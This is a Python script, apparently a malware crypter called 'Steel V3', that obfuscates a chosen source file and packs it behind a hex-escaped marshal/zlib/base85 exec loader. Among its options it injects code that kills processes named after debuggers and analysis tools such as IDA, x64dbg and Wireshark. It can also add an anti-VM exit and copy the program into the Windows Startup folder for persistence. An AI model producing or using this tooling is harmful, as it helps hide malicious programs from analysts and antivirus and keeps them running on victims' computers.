import requests
import json
import sys
import os
import time
from requests import session
import datetime
from random import SystemRandom
import random
from datetime import datetime
from sh import whoami
import getpass
import pytz  
import datetime
import ast, random, base64, os, marshal, zlib, sys
from colorama import Fore as f

P = '\033[95m'
CYAN = '\033[96m'
DARK = '\033[36m'
B = '\033[94m'
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
BO = '\033[1m'
UG = '\033[35m'
PT = '\033[37m'
PT1 = '\33[5;47;31m'
UNDER = '\033[4m'
N = '\033[0m'
H = '\33[5;41;37m'
H1 = '\33[2;41;37m'
L = '\033[0;0m'
CY = '\33[5;37;45m'
BB = '\33[7;49;93m'
BR = '\33[7;49;33m'
GR1 = '\33[5;49;90m'
GR = '\33[7;49;90m'
WW1 = '\33[7;41;32m'
WW = '\33[5;31;42m'
MG = '\33[7;49;36m'
WH = '\33[7;49;37m'
PTH = '\33[7;49;37m'
RED = '\033[31m'
GRY = '\033[90m'
WW2 = '\33[5;35;46m'


os.system("clear")

class Stealthfiy(ast.NodeTransformer):
    def __init__(self):
        self.mapping = {}
        self.function_parameters = {}

    def obfuscate_name(self, name):
        if name not in self.mapping:
            self.mapping[name] = "".join(random.choice(["%π", "∆£"]) for _ in range(40))
        return self.mapping[name]

    def visit_Import(self, node):
        for alias in node.names:
            if alias.asname:
                obfuscated_name = self.obfuscate_name(alias.asname)
                self.mapping[alias.asname] = obfuscated_name
                alias.asname = obfuscated_name
        return self.generic_visit(node)

    def visit_FunctionDef(self, node):
        for arg in node.args.args:
            obfuscated_name = self.obfuscate_name(arg.arg)
            self.function_parameters[arg.arg] = obfuscated_name
            arg.arg = obfuscated_name

        if node.body and isinstance(node.body[0], ast.Expr) and isinstance(node.body[0].value, ast.Str):
            node.body = node.body[1:]  # Remove the docstring

        return self.generic_visit(node)

    visit_AsyncFunctionDef = visit_FunctionDef

    def visit_Name(self, node):
        if isinstance(node.ctx, ast.Store):
            node.id = self.obfuscate_name(node.id)
        elif isinstance(node.ctx, ast.Load) and node.id in self.mapping:
            node.id = self.mapping[node.id]
        return node

    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id in self.function_parameters:
            node.func.id = self.function_parameters[node.func.id]

        if isinstance(node.func, ast.Attribute) and isinstance(node.func.value, ast.Name) and node.func.value.id in self.mapping:
            node.func.value.id = self.mapping[node.func.value.id]

        node.args = [self.visit(arg) if isinstance(arg, ast.Name) and arg.id in self.mapping else arg for arg in node.args]

        return self.generic_visit(node)

    def visit_ClassDef(self, node):
        obfuscated_name = self.obfuscate_name(node.name)
        self.mapping[node.name] = obfuscated_name
        node.name = obfuscated_name
        return self.generic_visit(node)

    def visit_Return(self, node):
        if isinstance(node.value, ast.Name) and node.value.id in self.mapping:
            node.value.id = self.mapping[node.value.id]
        return self.generic_visit(node)

    def visit_ExceptHandler(self, node):
        if node.name:
            obfuscated_name = self.obfuscate_name(node.name)
            self.mapping[node.name] = obfuscated_name
            node.name = obfuscated_name
        return self.generic_visit(node)

    def visit_With(self, node):
        node.items = [self.visit(item) for item in node.items]
        return self.generic_visit(node)

    def visit_Global(self, node):
        node.names = [self.obfuscate_name(name) for name in node.names]
        return node

def Stealth(code, iterations):
    tree = ast.parse(code)
    obfuscator = Stealthfiy()
    for _ in range(iterations):
        obfuscator.visit(tree)
    obfuscated_code = ast.unparse(tree)
    return obfuscated_code

def Add_Dead_code(code):
    obfuscated_lines = code.split('\n')
    new_lines = []
    for line in obfuscated_lines:
        new_lines.append(line)
        dead_code_length = random.randint(2, 5)
        dead_code = '__RacknarocK_V3__' * dead_code_length
        new_lines.append(f"#{dead_code}")
    return '\n'.join(new_lines)

def Stealthcrypt(content):
    CMARK = '__RacknarocK__V3__' * 15
    COFFSET = 10
    marshaled_data = marshal.dumps(content.encode())
    compressed_data = zlib.compress(marshaled_data)
    encoded_data = base64.b85encode(compressed_data).decode()
    b64_encoded_data = base64.b64encode(encoded_data.encode()).decode()
    code = f'{CMARK} = ""\n'
    for i in range(0, len(b64_encoded_data), COFFSET):
        chunk = b64_encoded_data[i:i+COFFSET]
        code += f'{CMARK} += "{chunk}"\n'
    code += f"exec(__import__('\\x6D\\x61\\x72\\x73\\x68\\x61\\x6C').loads(__import__('\\x7A\\x6C\\x69\\x62').decompress(__import__('\\x62\\x61\\x73\\x65\\x36\\x34').b85decode(__import__('\\x62\\x61\\x73\\x65\\x36\\x34').b64decode({CMARK}.encode()).decode()))))"
    return code

try:
    print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(f"""                                         
                                         {GR}[INFORMASI]{L}
 ██╗░░░██╗██╗░░░██╗██╗██████╗░     
 ██║░░░██║██║░░░██║██║██╔══██╗     {PT}🔹AUTOR   = Racknarock{L}
 ╚██╗░██╔╝╚██╗░██╔╝██║██████╔╝     {PT}🔹RNGv30T = {GRY}Ready{L}
 ░╚████╔╝░░╚████╔╝░██║██╔═══╝░     {PT}🔹LOGIN   = VVIP{L}{PT}
 ░░╚██╔╝░░░░╚██╔╝░░██║██║░░░░░     {PT}🔹SERVER  = {WW} {BO}ONLINE{L}{WW} {L}
 ░░░╚═╝░░░░░░╚═╝░░░╚═╝╚═╝░░░░░
""")
    print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    file_path = input(f.RED + "File: ")
    iterations = int(input(f.RED + "Number of Obfuscation Layers: "))
    antivm = input(f.RED + "Enable Anti VM? [y/n]: ")  
    add_junk = input("Add Dead Code? [y/n]: ")
    startup = input("Use Startup? [y/n]: ")
    anti_debug = input("Use Anti-Debug? [y/n]: ")
    enc_and_comp = input(f.RED + "Use Encoding And Encryption? [y/n]: ")

    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            code = file.read()
    except FileNotFoundError:
        print(f.RED + "File not found. Please provide a valid file path.")
        sys.exit(1)
    
    obfuscated_code = Stealth(code, iterations)
    
    if antivm.lower() == 'y':
        obfuscated_code += """
import sys
def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix
if in_virtualenv() == True:
    sys.exit()
"""

    if anti_debug.lower() == 'y':
        obfuscated_code += """
import threading,time,psutil,os
keywords = [
    'Fiddler', 'WireShark','dnSpy', 'HTTPDebuggerUI','x32dbg', 'x64dbg', 'DotNetReactor', 'HTTPDebuggerSvc', 'HTTPDebuggerUI',
    'ida', 'scylla', 'idag',
    'scylla', 'scylla_x64', 'scylla_hide', 'scylla_x64_hide',
    'scylla_x86', 'scylla_x86_hide', 'scylla_x64_hide',
    'scylla_x64', 'scylla_x64_hide',
    'scylla_hide', 'scylla_x86_hide',
    'ImmunityDebugger', 'MegaDumper',
    'debug', 'imdmp', 'graywolf', 'packets', 'memory', 'analyzing', 'debugging', 'process', 'managem', 'memor',
    'dede', 'refs', 'procdump', 'netchk', 'netLim', 'sandbox',
    'OllyDbg', 'OllyICE', 'x64dbg', 'TitanHide', 'Salamander', 'SmartCheck', 'ReFox', 'ReClass', 'PhantOm',
    'PETools', 'PE Explorer', 'OllyDump', 'MegaDumper', 'IDA Pro', 'HWiNFO', 'Guardian', 'Enigma Protector',
    'DebugShield', 'Code Virtualizer', 'CFF Explorer', 'IdaTools', 'IDA Stealer', 'OllyDumpEx', 'OllyHeapTrace',
    'PEiD', 'PE-Scrambler', 'PE-Sieve', 'ScyllaHide', 'PE-bear', 'PE-bear-x64', 'PE-bear-x86', 'PEInfo', 'PEStudio',
    'PEView', 'Protection ID', 'Stud_PE', 'UPX', 'IDA Plugin', 'PE Tools', 'PEview', 'IDA Pro', 'x64dbg',
    'x32dbg', 'OllyDbg', 'OllyICE', 'ScyllaHide', 'PE-sieve', 'IDA', 'IDA64', 'ImmDbg', 'IMMUNITY',
    'OllyDumpEx', 'RDG Packer Detector', 'LimeCrypt', 'HWiNFO', 'Sysinternals', 'SysAnalyzer', 'IDA Python',
    'PEDumper', 'PEDump', 'PE Inspector', 'IDA Plugin', 'ScyllaSSA', 'DumpME', 'Scylla_x64', 'Scylla_x86',
    'Scylla_x64_x86', 'IDA_PRO', 'ScyllaHide_x64', 'ScyllaHide_x86', 'ScyllaHide_x64_x86', 'ScyllaHide_x86_x64'
]
def check_processes():
    while True:
        try:
            for process in psutil.process_iter():
                for keyword in keywords:
                    if keyword.lower() in process.name().lower():
                        process.kill()
        except Exception:
            pass
        time.sleep(0.5)
threading.Thread(target=check_processes, daemon=True).start()
"""

    if startup.lower() == 'y':
        obfuscated_code += """
import sys,os,shutil
currentfile = sys.argv[0]
folder_path = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup')
shutil.copy(currentfile,folder_path)
"""
    
    if add_junk.lower() == 'y':
        obfuscated_code = Add_Dead_code(obfuscated_code)
    
    if enc_and_comp.lower() == 'y':
        obfuscated_code = Stealthcrypt(obfuscated_code)
  
    file_name = file_path.rsplit('.', 1)[0]
    extension = file_path.rsplit('.', 1)[1]
    obfuscated_file_path = file_name + "_obf." + extension
    
    try:
        with open(obfuscated_file_path, 'w', encoding='utf-8') as file:
            file.write("# Obfuscated With Steel V3 By RacknarocK\n" + obfuscated_code)
        print(f.RED + "Code Saved To:", obfuscated_file_path)
    except IOError as e:
        print(f.RED + "Error saving the obfuscated code:", str(e))
    except Exception as e:
        print(f.RED + "An unexpected error occurred while saving the obfuscated code:", str(e))
except ValueError:
    print(f.RED + "Invalid input. Please enter a valid number of obfuscation layers.")
except Exception as e:
    print(f.RED + "An unexpected error occurred:", str(e))
input()
